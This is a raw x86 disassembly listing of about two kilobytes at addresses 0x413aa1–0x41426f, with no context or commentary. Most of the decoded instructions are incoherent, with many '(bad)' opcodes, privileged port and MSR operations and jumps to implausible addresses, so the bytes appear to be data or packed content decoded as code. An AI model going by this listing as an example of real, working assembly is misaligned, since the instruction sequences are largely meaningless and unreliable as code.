  413aa1:	or     DWORD PTR [esi+0x2a],esi
  413aa4:	and    eax,0x2712114d
  413aa9:	popa   
  413aaa:	neg    BYTE PTR [ebx-0x6beda410]
  413ab0:	(bad)
  413ab3:	ins    BYTE PTR es:[edi],dx
  413ab4:	fwait
  413ab5:	retf   
  413ab6:	pop    esi
  413ab7:	inc    esp
  413ab8:	inc    edi
  413ab9:	xchg   BYTE PTR [ecx+eiz*2-0x69a284c9],al
  413ac0:	ds in  al,dx
  413ac2:	mov    edi,fs
  413ac4:	loopne 0x413aa5
  413ac6:	adc    ch,BYTE PTR [ebx-0x2c]
  413ac9:	xchg   DWORD PTR [ebp+edi*8-0x72],ebp
  413acd:	jle    0x413b1b
  413acf:	adc    BYTE PTR [edi-0x47],bh
  413ad2:	jne    0x413b01
  413ad4:	rcl    al,0x5b
  413ad7:	add    DWORD PTR [edi-0x3c9658ea],0xffffffc8
  413ade:	sbb    eax,DWORD PTR [edx+0x47988e87]
  413ae4:	std    
  413ae5:	dec    ebp
  413ae6:	mov    dh,0x9
  413ae8:	mov    ch,0x25
  413aea:	mov    DWORD PTR [edi],esp
  413aec:	adc    al,BYTE PTR [ecx+0xa]
  413aef:	xchg   ebx,eax
  413af0:	std    
  413af1:	rol    ebp,0x6
  413af4:	and    dl,BYTE PTR [eax+0x56]
  413af7:	or     al,0xa
  413af9:	dec    dl
  413afb:	mov    ds:0x29f3195c,al
  413b00:	and    esp,DWORD PTR [eax+0x79]
  413b03:	mov    ebx,0xf8ae1f13
  413b08:	clc    
  413b09:	push   0x42
  413b0b:	jmp    0x413b5b
  413b0d:	xlat   BYTE PTR ds:[ebx]
  413b0e:	cmp    DWORD PTR [edx-0x65],edi
  413b11:	inc    esp
  413b12:	in     eax,dx
  413b13:	enter  0xb210,0xdb
  413b17:	push   ss
  413b18:	dec    edi
  413b19:	adc    eax,edi
  413b1b:	add    al,0x2f
  413b1d:	xor    eax,0x151b484
  413b22:	push   es
  413b23:	mov    ebp,0xa796e7b4
  413b28:	mov    DWORD PTR [edx+ebp*8-0x4eb79d68],esi
  413b2f:	jnp    0x413b3f
  413b31:	imul   esi,DWORD PTR [eax+0x793a1d35],0x60
  413b38:	sbb    DWORD PTR [edi+0x33],0x735df587
  413b3f:	pop    ebx
  413b40:	push   edi
  413b41:	adc    DWORD PTR [ecx],esp
  413b43:	jnp    0x413b0a
  413b45:	and    al,0xbc
  413b47:	xor    eax,0xe7e574
  413b4c:	outs   dx,DWORD PTR ds:[esi]
  413b4d:	retf   
  413b4e:	mov    ah,bh
  413b50:	sti    
  413b51:	hlt    
  413b52:	or     ebx,DWORD PTR [ebx-0x5d712bdf]
  413b58:	scas   eax,DWORD PTR es:[edi]
  413b59:	call   0x4a95:0x6a84f2f1
  413b60:	(bad)  
  413b61:	sbb    eax,0x3f910522
  413b66:	or     al,bh
  413b68:	cmp    ebp,DWORD PTR [edx-0x12f759f2]
  413b6e:	pop    esp
  413b6f:	cmp    cl,BYTE PTR [esi+0x5e]
  413b72:	or     dh,ch
  413b74:	in     al,0x46
  413b76:	or     bl,bl
  413b78:	rcr    DWORD PTR [ecx],0x66
  413b7b:	out    dx,al
  413b7c:	pop    edx
  413b7d:	lds    ebx,FWORD PTR [ecx+0x4b]
  413b80:	stc    
  413b81:	stos   DWORD PTR es:[edi],eax
  413b82:	inc    edi
  413b83:	cmp    al,0x5a
  413b85:	fnsave [edi+0x56053943]
  413b8b:	inc    DWORD PTR cs:[eax+0x5b]
  413b8f:	jg     0x413bbc
  413b91:	test   al,0x26
  413b93:	mov    ?,WORD PTR [ebx]
  413b95:	(bad)  [ecx-0x520bd936]
  413b9b:	(bad)  
  413b9c:	loop   0x413bb8
  413b9e:	repz into 
  413ba0:	stc    
  413ba1:	mov    eax,ds:0xa863dbef
  413ba6:	(bad)  
  413ba7:	pop    eax
  413ba8:	jo     0x413b51
  413baa:	fst    QWORD PTR [ecx]
  413bac:	xchg   esi,eax
  413bad:	mov    dl,al
  413baf:	jno    0x413b33
  413bb1:	shr    BYTE PTR [esi],0xae
  413bb4:	mov    ebx,0x66080b4f
  413bb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bba:	jne    0x413c00
  413bbc:	push   eax
  413bbd:	mov    ch,ch
  413bbf:	je     0xfecaf1f7
  413bc5:	pusha  
  413bc6:	jecxz  0x413bde
  413bc8:	or     DWORD PTR [esi],edx
  413bca:	int3   
  413bcb:	fld    TBYTE PTR [esi]
  413bcd:	mov    esp,0xc2a063d6
  413bd2:	mov    bl,0xa0
  413bd4:	popa   
  413bd5:	or     eax,DWORD PTR [esi-0x656dea2f]
  413bdb:	xchg   dh,dh
  413bdd:	pop    ebp
  413bde:	jmp    0xd76aa203
  413be3:	inc    ebx
  413be4:	mov    ebp,0x494f6b11
  413be9:	cli    
  413bea:	jbe    0x413b81
  413bec:	pop    ds
  413bed:	xchg   DWORD PTR [esi-0x55],eax
  413bf0:	mov    esi,DWORD PTR [edx+0xd]
  413bf3:	dec    ebp
  413bf4:	int3   
  413bf5:	add    al,0xf9
  413bf7:	inc    esp
  413bf8:	sar    dh,1
  413bfa:	arpl   WORD PTR [eax+0x6867dfd],bp
  413c00:	std    
  413c01:	aad    0xd5
  413c03:	stos   BYTE PTR es:[edi],al
  413c04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c05:	daa    
  413c06:	jg     0x413bb2
  413c08:	adc    ebp,DWORD PTR [edx-0x5d]
  413c0b:	(bad)  
  413c0c:	sub    edx,edi
  413c0e:	mov    edi,DWORD PTR [ebp-0xc]
  413c11:	mov    ebx,DWORD PTR [ebp-0x14]
  413c14:	xor    edi,eax
  413c16:	add    edi,ecx
  413c18:	jmp    0x413ea0
  413c1d:	(bad)  
  413c1e:	ror    al,cl
  413c20:	iret   
  413c21:	aam    0xd1
  413c23:	(bad)
  413c26:	ins    DWORD PTR es:[edi],dx
  413c27:	js     0x413c82
  413c29:	xchg   esp,eax
  413c2a:	fbld   TBYTE PTR [ebx+0x7f0002c9]
  413c30:	js     0x413c17
  413c32:	jle    0x413cac
  413c34:	js     0x413bd4
  413c36:	push   eax
  413c37:	xor    bl,BYTE PTR [eax+0x1b]
  413c3a:	mov    al,es:0x5e8d9ac7
  413c40:	ficom  WORD PTR [esi+0x20a0db9d]
  413c46:	loopne 0x413ca5
  413c48:	fadd   st(6),st
  413c4a:	test   bl,al
  413c4c:	call   0x6a146e2a
  413c51:	in     eax,dx
  413c52:	cmp    DWORD PTR [esi],esp
  413c54:	xchg   edi,eax
  413c55:	sub    cl,bh
  413c57:	mov    esi,0x5053e5e2
  413c5c:	fbld   TBYTE PTR [edi-0x3ae5201d]
  413c62:	jecxz  0x413c91
  413c64:	sahf   
  413c65:	xchg   BYTE PTR [esi+0x35],bh
  413c68:	cmp    BYTE PTR [esi],dh
  413c6a:	sub    DWORD PTR [edi+0x43ea13aa],esp
  413c70:	rcr    DWORD PTR [ebp+eax*4-0x1e],0x4e
  413c75:	add    al,0xc3
  413c77:	or     BYTE PTR [eax+eax*8+0x76f07245],al
  413c7e:	bnd ret 0x80ae
  413c82:	sbb    al,0xfb
  413c84:	wrmsr  
  413c86:	ror    ebx,1
  413c88:	xchg   ch,al
  413c8a:	popa   
  413c8b:	arpl   WORD PTR [ecx],cx
  413c8d:	push   0xffffffba
  413c8f:	lods   eax,DWORD PTR ds:[esi]
  413c90:	rcr    DWORD PTR [edi-0x42],0xe
  413c94:	lds    esp,FWORD PTR [eax-0x10]
  413c97:	jno    0x413c42
  413c99:	or     edx,0xab77dccb
  413c9f:	xor    BYTE PTR [edx],0x3
  413ca2:	ficomp WORD PTR [ebx+ecx*4]
  413ca5:	mov    ch,0xde
  413ca7:	mov    al,0xc8
  413ca9:	inc    ebx
  413caa:	sub    eax,ebp
  413cac:	dec    esp
  413cad:	int    0x9f
  413caf:	adc    cl,BYTE PTR [ebx]
  413cb1:	shl    cl,cl
  413cb3:	int    0xd6
  413cb5:	cmp    bl,0x7a
  413cb8:	dec    eax
  413cb9:	pop    ebx
  413cba:	inc    esi
  413cbb:	popf   
  413cbc:	scas   al,BYTE PTR es:[edi]
  413cbd:	sar    DWORD PTR [eax+0x203d4ec3],1
  413cc3:	std    
  413cc4:	dec    eax
  413cc5:	add    BYTE PTR [eax-0x95d4c58],0x19
  413ccc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ccd:	xor    edi,ebp
  413ccf:	xchg   ebp,eax
  413cd0:	test   BYTE PTR ds:0x3d69819e,ch
  413cd6:	das    
  413cd7:	in     al,0x9d
  413cd9:	rcr    BYTE PTR [edi-0x76],cl
  413cdc:	mov    ecx,0x221fc80a
  413ce1:	mov    ebp,0xfc26c20b
  413ce6:	mov    cl,0x8e
  413ce8:	or     DWORD PTR [ebx],esi
  413cea:	popf   
  413ceb:	and    BYTE PTR [ebx+0x6867d89b],ah
  413cf1:	enter  0xc91f,0x65
  413cf5:	add    ebp,0x4d7c14a5
  413cfb:	out    dx,al
  413cfc:	rol    DWORD PTR [ebx],1
  413cfe:	scas   eax,DWORD PTR es:[edi]
  413cff:	cmp    DWORD PTR [ebx-0x3d],ebp
  413d02:	sub    al,0x58
  413d04:	mov    WORD PTR [ebx+0x3ebfc731],cs
  413d0a:	mov    BYTE PTR [esi+0x80476d9],dh
  413d10:	bound  ecx,QWORD PTR es:[eax+ebx*8-0x3d]
  413d15:	jae    0x413d84
  413d17:	mov    eax,0x7785753d
  413d1c:	xchg   ebx,eax
  413d1d:	xchg   ecx,eax
  413d1e:	outs   dx,BYTE PTR ds:[esi]
  413d1f:	jl     0x413cfc
  413d21:	or     eax,0x36abe011
  413d26:	lods   eax,DWORD PTR ds:[esi]
  413d27:	(bad)  
  413d28:	jecxz  0x413d98
  413d2a:	xor    al,0xe
  413d2c:	ror    BYTE PTR [edx+0x5e],cl
  413d2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d30:	cmp    al,0x96
  413d32:	sub    DWORD PTR [eax-0x19f524db],ebp
  413d38:	in     eax,dx
  413d39:	daa    
  413d3a:	mov    ds:0x89d84c81,eax
  413d3f:	pop    es
  413d40:	xchg   ebp,eax
  413d41:	mov    edx,0xd65fc37a
  413d46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d47:	imul   edx,DWORD PTR [ebx],0xb6fab46e
  413d4d:	adc    ebx,DWORD PTR [esp+ebp*2+0x34968259]
  413d54:	pop    esi
  413d55:	adc    eax,0x5d272324
  413d5a:	call   0x2bc9cf62
  413d5f:	cmp    BYTE PTR [ebp+0x74],ah
  413d62:	xor    dl,BYTE PTR [edx+0x17274ff4]
  413d68:	dec    ecx
  413d69:	cdq    
  413d6a:	jmp    0x413cef
  413d6c:	les    ecx,FWORD PTR [eax+0x43]
  413d6f:	in     eax,dx
  413d70:	jp     0x413d53
  413d72:	push   edi
  413d73:	test   al,0xcd
  413d75:	or     al,0x73
  413d77:	fadd   QWORD PTR [esi]
  413d79:	cld    
  413d7a:	jb     0x413d65
  413d7c:	mov    ch,0x26
  413d7e:	pop    edi
  413d7f:	adc    eax,0xcf44310c
  413d84:	sar    BYTE PTR [ebp+0x6],1
  413d87:	inc    ecx
  413d88:	mov    bl,0x7a
  413d8a:	and    eax,0xa96fbecb
  413d8f:	mov    ds:0xc0354594,al
  413d94:	sar    BYTE PTR [ecx+0x2c0ec2f1],cl
  413d9a:	xchg   edx,eax
  413d9b:	loopne 0x413d58
  413d9d:	lods   eax,DWORD PTR ds:[esi]
  413d9e:	sbb    ecx,DWORD PTR [ebp-0x48]
  413da1:	push   esi
  413da2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413da3:	pop    edi
  413da4:	test   BYTE PTR [edx],ah
  413da6:	scas   al,BYTE PTR es:[edi]
  413da7:	mov    WORD PTR gs:[ebx-0x39b3c1],gs
  413dae:	int3   
  413daf:	rol    BYTE PTR [edi+0x595d7e13],cl
  413db5:	out    dx,al
  413db6:	in     al,dx
  413db7:	ret    
  413db8:	pop    edx
  413db9:	enter  0x7b62,0x22
  413dbd:	lahf   
  413dbe:	sub    al,0xf3
  413dc0:	cmp    DWORD PTR [esi],0x3d1c547d
  413dc6:	sbb    DWORD PTR [ebp+ebp*4+0x29],edi
  413dca:	xchg   BYTE PTR [edx+0x1091ce44],ah
  413dd0:	mov    ebx,0xe003dfec
  413dd5:	ins    DWORD PTR es:[edi],dx
  413dd6:	inc    edx
  413dd7:	das    
  413dd8:	in     al,0x6f
  413dda:	je     0x413db8
  413ddc:	jg     0x413db9
  413dde:	loope  0x413e2a
  413de0:	int3   
  413de1:	cmp    al,0xb8
  413de3:	sub    al,BYTE PTR [eax]
  413de5:	jge    0x413e4f
  413de7:	aaa    
  413de8:	(bad)
  413deb:	fild   DWORD PTR [eax]
  413ded:	out    0x8b,eax
  413def:	call   0x470d:0xeed8238d
  413df6:	sub    ecx,ebp
  413df8:	add    eax,0xeb6ea4d0
  413dfd:	cmc    
  413dfe:	(bad)  
  413dff:	mov    al,ds:0x2f35dcd4
  413e04:	popf   
  413e05:	mov    esp,0xc330c4a
  413e0a:	mov    edx,0x41a3e9f0
  413e0f:	js     0x413ddc
  413e11:	test   DWORD PTR [edx+0x7],edx
  413e14:	xchg   edi,eax
  413e15:	dec    eax
  413e16:	dec    ebx
  413e17:	xchg   ebp,eax
  413e18:	inc    ebx
  413e19:	xchg   ecx,eax
  413e1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e1b:	lds    ecx,FWORD PTR [ebp-0x42]
  413e1e:	out    0xdf,eax
  413e20:	mov    ecx,eax
  413e22:	xor    DWORD PTR [eax-0x10f337b8],ebp
  413e28:	push   ecx
  413e29:	inc    ebp
  413e2a:	xlat   BYTE PTR ss:[ebx]
  413e2c:	sub    eax,0x9d79d854
  413e31:	ja     0x413e72
  413e33:	dec    ebx
  413e34:	not    ebp
  413e36:	mov    bh,0x1a
  413e38:	add    eax,DWORD PTR [ebx+ebp*2]
  413e3b:	xchg   edi,eax
  413e3c:	jge    0x413de3
  413e3e:	pop    ecx
  413e3f:	loope  0x413dfb
  413e41:	inc    edx
  413e42:	mov    ebx,0xe54c190e
  413e47:	sbb    esp,DWORD PTR [ecx]
  413e49:	retf   
  413e4a:	into   
  413e4b:	fwait
  413e4c:	clc    
  413e4d:	jo     0x413eac
  413e4f:	pop    eax
  413e50:	pop    eax
  413e51:	arpl   di,dx
  413e53:	in     al,0xef
  413e55:	mov    al,0xc0
  413e57:	sbb    eax,0xdef941d5
  413e5c:	dec    edi
  413e5d:	leave  
  413e5e:	mov    ecx,0x85da1f4e
  413e63:	in     al,dx
  413e64:	jg     0x413e4a
  413e66:	lods   eax,DWORD PTR ds:[esi]
  413e67:	int    0x8f
  413e69:	shl    DWORD PTR [ecx-0x2f],1
  413e6c:	ficom  DWORD PTR [eax+eiz*4]
  413e6f:	cmp    al,0x7f
  413e71:	outs   dx,BYTE PTR ds:[esi]
  413e72:	mov    BYTE PTR [edx+0x4b],dl
  413e75:	mov    ch,0xa9
  413e77:	and    ebx,DWORD PTR [ecx+0x2dbcd253]
  413e7d:	push   cs
  413e7e:	fiadd  WORD PTR [eax+0x11b16fff]
  413e84:	sbb    eax,0x25b856d6
  413e89:	retf   0x7ee7
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	shr    DWORD PTR [si],1
  413e90:	imul   eax,DWORD PTR ds:0xceb6a304,0xf40e371
  413e9a:	stos   BYTE PTR es:[edi],al
  413e9b:	rcr    BYTE PTR [edx+0xfa2ca69],1
  413ea1:	scas   eax,DWORD PTR es:[edi]
  413ea2:	sti    
  413ea3:	mov    ebx,DWORD PTR [ebp-0x18]
  413ea6:	jmp    0x41412e
  413eab:	rol    bh,cl
  413ead:	leave  
  413eae:	rcr    ecx,1
  413eb0:	rcr    edx,1
  413eb2:	(bad)  
  413eb3:	enter  0x3d11,0x8f
  413eb7:	adc    eax,0xef3151c0
  413ebc:	push   es
  413ebd:	jg     0x413f37
  413ebf:	in     eax,0x7e
  413ec1:	js     0x413f3b
  413ec3:	(bad)  
  413ec4:	sar    BYTE PTR [ebp+0x47],1
  413ec7:	jge    0x413f0c
  413ec9:	cmp    cl,BYTE PTR [eax]
  413ecb:	mov    ecx,0xb858c433
  413ed0:	arpl   WORD PTR [ebx],ax
  413ed2:	out    0x1,eax
  413ed4:	dec    ebx
  413ed5:	push   cs
  413ed6:	test   BYTE PTR [ebx+0x11],al
  413ed9:	mov    bl,0x3e
  413edb:	inc    esp
  413edc:	mov    eax,ds:0xa786986f
  413ee1:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  413ee3:	dec    eax
  413ee4:	sbb    BYTE PTR [ebx],cl
  413ee6:	push   0x39
  413ee8:	add    esp,DWORD PTR [ebx-0x70]
  413eeb:	sti    
  413eec:	push   esi
  413eed:	jg     0x413f45
  413eef:	fldenv [esi]
  413ef1:	dec    eax
  413ef3:	xchg   ebp,eax
  413ef4:	js     0x413e7e
  413ef6:	out    dx,eax
  413ef7:	or     BYTE PTR [edi],0xdc
  413efa:	mov    ah,0xa6
  413efc:	sbb    eax,0xa11db1c4
  413f01:	mov    dl,0xba
  413f03:	cmp    cl,BYTE PTR [edi-0x7d]
  413f06:	cmp    esi,DWORD PTR [eax+0x5a]
  413f09:	sahf   
  413f0a:	les    ebp,FWORD PTR [esi]
  413f0c:	dec    esp
  413f0d:	mov    ebx,0xb2d268c2
  413f12:	out    dx,al
  413f13:	repz popf 
  413f15:	xor    ecx,DWORD PTR [ebp+0x5c]
  413f18:	pop    ss
  413f19:	(bad)  
  413f1a:	imul   ebx,DWORD PTR [edx],0xb4ea7d78
  413f20:	daa    
  413f21:	adc    al,0x1f
  413f23:	dec    esp
  413f24:	jo     0x413f41
  413f26:	cwde   
  413f27:	(bad)  ds:0xff844522
  413f2d:	retf   0x7362
  413f30:	cmp    al,BYTE PTR [edx+0x269e7580]
  413f36:	cmp    DWORD PTR [ebp+0x75619672],0xfffffff8
  413f3d:	retf   
  413f3e:	xchg   DWORD PTR [edi-0x19],eax
  413f41:	push   esp
  413f42:	xchg   edi,eax
  413f43:	jmp    0x413f57
  413f45:	mov    bh,0xa2
  413f47:	cmp    BYTE PTR [ebx+0x5a],dh
  413f4a:	cli    
  413f4b:	add    eax,0xda4d4de9
  413f50:	mov    edi,ebp
  413f52:	push   ecx
  413f53:	nop
  413f54:	sub    ebp,DWORD PTR [ebp-0x6f]
  413f57:	cdq    
  413f58:	leave  
  413f59:	mov    BYTE PTR [edx-0x7b1005d8],ch
  413f5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f60:	jae    0x413f3d
  413f62:	pop    ebx
  413f63:	bound  eax,QWORD PTR [esi+0x64e4ef3c]
  413f69:	cdq    
  413f6a:	retf   
  413f6b:	pop    ss
  413f6c:	dec    eax
  413f6d:	dec    esi
  413f6e:	leave  
  413f6f:	cli    
  413f70:	fcomip st,st(2)
  413f72:	dec    eax
  413f73:	inc    ebp
  413f74:	ret    
  413f75:	add    eax,0x1405190a
  413f7a:	es push eax
  413f7c:	outs   dx,BYTE PTR ds:[esi]
  413f7d:	loop   0x413f09
  413f7f:	mov    cl,0x83
  413f81:	aam    0x5
  413f83:	sub    al,BYTE PTR [edx+0xc62eb97]
  413f89:	lods   al,BYTE PTR ds:[esi]
  413f8a:	add    eax,0x18f9f3f8
  413f8f:	loopne 0x413fb2
  413f91:	fwait
  413f92:	repz leave 
  413f94:	loope  0x413f3d
  413f96:	lea    esp,[esp+esi*4]
  413f99:	dec    eax
  413f9a:	mov    edi,ebx
  413f9c:	jb     0x414012
  413f9e:	out    0xd0,eax
  413fa0:	cmp    eax,0x2a51471c
  413fa5:	jbe    0x413fb8
  413fa7:	(bad)  
  413fa8:	xchg   edi,eax
  413fa9:	and    bl,BYTE PTR [ebp+0x22]
  413fac:	mov    ds:0xea273aea,al
  413fb1:	inc    edx
  413fb2:	xchg   edi,eax
  413fb3:	push   ds
  413fb4:	add    BYTE PTR [edx],ch
  413fb6:	xchg   esi,eax
  413fb7:	(bad)  
  413fb9:	fwait
  413fba:	icebp  
  413fbb:	mov    esi,0x36a77460
  413fc0:	repz int 0xce
  413fc3:	popa   
  413fc4:	mov    ecx,DWORD PTR [ecx]
  413fc6:	xor    eax,0xd5088ef5
  413fcb:	shl    ebx,0xe4
  413fce:	and    ah,bh
  413fd0:	(bad)  
  413fd2:	xchg   edx,eax
  413fd3:	ja     0x414054
  413fd5:	out    dx,al
  413fd6:	jns    0x413fcb
  413fd8:	cmp    al,BYTE PTR [edi+0x3b521d6]
  413fde:	mov    al,ds:0x260a6e75
  413fe3:	adc    cl,dl
  413fe5:	push   edi
  413fe6:	pop    ebx
  413fe7:	dec    esi
  413fe8:	add    al,0x2d
  413fea:	sahf   
  413feb:	jbe    0x414005
  413fed:	js     0x413ff7
  413fef:	fidiv  WORD PTR [ecx+0x29]
  413ff2:	(bad)  
  413ff3:	sbb    al,0xcc
  413ff5:	sub    DWORD PTR es:[ebx],ecx
  413ff8:	cmp    eax,0x593cef7b
  413ffd:	jo     0x413fa7
  413fff:	pop    eax
  414000:	les    edx,FWORD PTR [edx-0x4de5433c]
  414006:	fistp  DWORD PTR [ecx+0x1e92ece0]
  41400c:	pop    es
  41400d:	in     eax,dx
  41400e:	sbb    al,0x59
  414010:	rcr    DWORD PTR [ecx+ebx*4-0x2111424c],cl
  414017:	mov    ecx,0x81131f3f
  41401c:	jb     0x414084
  41401e:	xchg   ebp,eax
  41401f:	jnp    0x414040
  414021:	out    0x34,al
  414023:	xchg   ebp,eax
  414024:	sbb    bh,BYTE PTR [esi]
  414026:	and    eax,0x1f824cff
  41402b:	pop    edi
  41402c:	jecxz  0x414016
  41402e:	arpl   WORD PTR [ecx-0x5d5dd6d2],bp
  414034:	imul   ecx,eax,0xfffffff7
  414037:	push   esi
  414038:	les    esi,FWORD PTR [esi+0x1c]
  41403b:	lock pushf 
  41403d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41403e:	dec    ebx
  41403f:	test   al,0x40
  414041:	mov    gs,WORD PTR [eax+0x4f]
  414044:	ret    0x3ea1
  414047:	xchg   dl,bh
  414049:	ds in  eax,dx
  41404b:	outs   dx,BYTE PTR ds:[esi]
  41404c:	test   eax,0xb48b3b5c
  414051:	loopne 0x414075
  414053:	loopne 0x414070
  414055:	pop    esi
  414056:	sbb    al,0x17
  414058:	in     al,0xb1
  41405a:	xchg   edi,eax
  41405b:	dec    esp
  41405c:	or     edx,esp
  41405e:	test   eax,0x55f0c993
  414063:	mov    esp,0xa5c666eb
  414068:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414069:	es pushf 
  41406b:	(bad)  
  41406c:	int    0x24
  41406e:	mov    bl,0xc6
  414070:	daa    
  414071:	inc    esi
  414072:	mov    eax,ds:0x947022b5
  414077:	push   es
  414078:	ja     0x4140a7
  41407a:	pop    esp
  41407b:	jno    0x41406e
  41407d:	sub    al,0x88
  41407f:	adc    eax,DWORD PTR [ebp+0x3d111328]
  414085:	or     eax,0x21b3a8c7
  41408a:	pop    ds
  41408b:	out    dx,eax
  41408c:	sbb    BYTE PTR [edx+0x54ff9df2],cl
  414092:	icebp  
  414093:	(bad)  
  414094:	jp     0x41405e
  414096:	mov    ebx,0x2871e1dc
  41409b:	rcl    esp,0x41
  41409e:	mov    esi,DWORD PTR [ebp-0x3a]
  4140a1:	mov    dl,0x2d
  4140a3:	or     DWORD PTR [esi+ebx*8],ebp
  4140a6:	cmp    al,0x2c
  4140a8:	inc    ebp
  4140a9:	sub    BYTE PTR [esi],bl
  4140ab:	dec    ebx
  4140ac:	cmp    ah,BYTE PTR [ebp-0x617537bc]
  4140b2:	enter  0x1604,0x2d
  4140b6:	mov    BYTE PTR [eax],0xcb
  4140b9:	ja     0x4140ba
  4140bb:	arpl   WORD PTR [eax],si
  4140bd:	call   0x4123:0x8b69699e
  4140c4:	ret    
  4140c5:	ret    
  4140c6:	and    DWORD PTR [esi-0x9ad4d5b],edx
  4140cc:	ins    DWORD PTR es:[edi],dx
  4140cd:	stc    
  4140ce:	sub    edi,0xa
  4140d1:	fs mov bh,0xb8
  4140d4:	push   0x2f636595
  4140d9:	pop    esi
  4140da:	mov    esi,0x82d6e631
  4140df:	aad    0xda
  4140e1:	pop    esi
  4140e2:	(bad)  
  4140e3:	dec    dl
  4140e5:	(bad)  
  4140e6:	in     eax,dx
  4140e7:	push   ebp
  4140e8:	shr    DWORD PTR [eax+eiz*4-0x1b],0x98
  4140ed:	ror    bh,0x57
  4140f0:	mov    esi,0xa51e4541
  4140f5:	call   0xfbe37725
  4140fa:	lds    eax,FWORD PTR ds:0xbbcbea49
  414100:	adc    al,0xe8
  414102:	retf   0xc25f
  414105:	dec    ebx
  414106:	ja     0x4140d9
  414108:	inc    eax
  414109:	jmp    0xc63dea2a
  41410e:	imul   ecx,DWORD PTR [edi],0xbc81a4d6
  414114:	out    0x4c,al
  414116:	fwait
  414117:	repnz stos BYTE PTR es:[edi],al
  414119:	loope  0x4140c5
  41411b:	and    eax,0xa5fba981
  414120:	or     al,0x60
  414122:	pop    ecx
  414123:	sbb    eax,0x3c9ac042
  414128:	or     BYTE PTR [ebx+0x3a36be29],al
  41412e:	xor    ebx,eax
  414130:	jmp    0x4143b8
  414135:	les    edi,FWORD PTR [edi]
  414137:	int    0xc9
  414139:	(bad)  
  41413b:	aam    0x3d
  41413d:	mov    eax,ds:0x7b145a14
  414142:	inc    eax
  414143:	mov    cl,0x6c
  414145:	push   esp
  414146:	add    al,0x7f
  414148:	js     0x41412f
  41414a:	jle    0x4141c4
  41414c:	js     0x414113
  41414e:	add    ebp,DWORD PTR ds:0xd062cde
  414154:	in     al,dx
  414155:	or     eax,0x7241b707
  41415a:	aam    0xb1
  41415c:	pop    es
  41415d:	or     BYTE PTR [ecx+0x5f26debd],0x15
  414164:	dec    ecx
  414165:	mov    DWORD PTR [ebp-0x6138d421],esp
  41416b:	and    DWORD PTR [eax+0x66],eax
  41416e:	scas   al,BYTE PTR es:[edi]
  41416f:	pushf  
  414170:	xchg   BYTE PTR [esi-0x239c6341],bh
  414176:	inc    esi
  414177:	cmp    eax,DWORD PTR [ebx]
  414179:	sbb    ah,BYTE PTR [ecx]
  41417b:	mov    ds:0x4256afeb,al
  414180:	(bad)  
  414181:	push   eax
  414182:	iret   
  414183:	push   edx
  414184:	cmp    ebp,edx
  414186:	out    dx,eax
  414187:	push   ebp
  414188:	(bad)  
  414189:	jmp    0x5290:0x5305a053
  414190:	lea    esi,[edx+0x5c]
  414193:	call   0xe3f9:0x9a9b3415
  41419a:	mov    ds:0x2de711af,al
  41419f:	cdq    
  4141a0:	test   eax,0x7a5d73b6
  4141a5:	mov    dl,0x52
  4141a7:	adc    bh,BYTE PTR [edi+0x1e]
  4141aa:	fadd   DWORD PTR [ecx+ebp*1]
  4141ad:	or     BYTE PTR ds:0xad55a26d,bl
  4141b3:	mov    esi,0x66e39878
  4141b8:	inc    ebp
  4141b9:	retf   0x5e63
  4141bc:	retf   
  4141bd:	clc    
  4141be:	mov    bl,dh
  4141c0:	mov    ds:0x25db1c4e,al
  4141c5:	dec    esp
  4141c6:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141c8:	add    eax,0xe3411c60
  4141cd:	pop    edi
  4141ce:	push   edx
  4141cf:	dec    esp
  4141d0:	adc    al,0x3c
  4141d2:	std    
  4141d3:	mov    al,0x2e
  4141d5:	inc    ebp
  4141d6:	je     0x41423c
  4141d8:	sahf   
  4141d9:	mov    al,0x1d
  4141db:	stos   DWORD PTR es:[edi],eax
  4141dc:	xchg   edi,eax
  4141dd:	mov    ah,bl
  4141df:	mov    ds,edi
  4141e1:	retf   0x8ded
  4141e4:	lahf   
  4141e5:	setno  cl
  4141e8:	loope  0x4141e2
  4141ea:	stos   DWORD PTR es:[edi],eax
  4141eb:	in     eax,0x70
  4141ed:	ja     0x4141c5
  4141ef:	fldenv [eax]
  4141f1:	repz leave 
  4141f3:	mov    ds:0xd2c19c8,eax
  4141f8:	mov    dh,0x6d
  4141fa:	pop    edx
  4141fb:	push   eax
  4141fc:	mov    dl,0x30
  4141fe:	sub    eax,0xe73ca6f5
  414203:	xchg   ch,bl
  414205:	push   esp
  414206:	mov    ebp,0x22db9a19
  41420b:	mov    esi,0x17a359cd
  414210:	mov    edx,0xd4df5cd1
  414215:	cmp    cl,dh
  414217:	adc    DWORD PTR [edi-0x31c00ed7],esi
  41421d:	add    edi,DWORD PTR [esi+0x50]
  414220:	cli    
  414221:	jg     0x414218
  414223:	bound  ecx,QWORD PTR [eax+0x48c90cf2]
  414229:	rol    BYTE PTR [ebp+0x2e6d4c66],cl
  41422f:	jo     0x414284
  414231:	push   eax
  414232:	jo     0x414229
  414234:	mov    ebp,0x1de6d83f
  414239:	mov    esp,0x6b604d
  41423e:	add    al,0x12
  414240:	xchg   esp,eax
  414241:	test   DWORD PTR [edx+0x79],edx
  414244:	adc    al,0x72
  414246:	test   al,0x28
  414248:	sub    DWORD PTR [ebp+0x3641e21e],ecx
  41424e:	pop    ebp
  41424f:	push   ss
  414250:	aas    
  414251:	test   al,0xe0
  414253:	cmp    bl,BYTE PTR [esi-0xc]
  414256:	cmp    al,0x82
  414258:	xor    BYTE PTR [ebx],ah
  41425a:	nop
  41425b:	push   ds
  41425c:	jg     0x41421f
  41425e:	or     ebx,DWORD PTR ds:0xe0ebc651
  414264:	pop    ebx
  414265:	and    DWORD PTR [ebp+0x6b],esp
  414268:	int    0x5b
  41426a:	adc    eax,0x8c8a127f
  41426f:	retf   0x9975
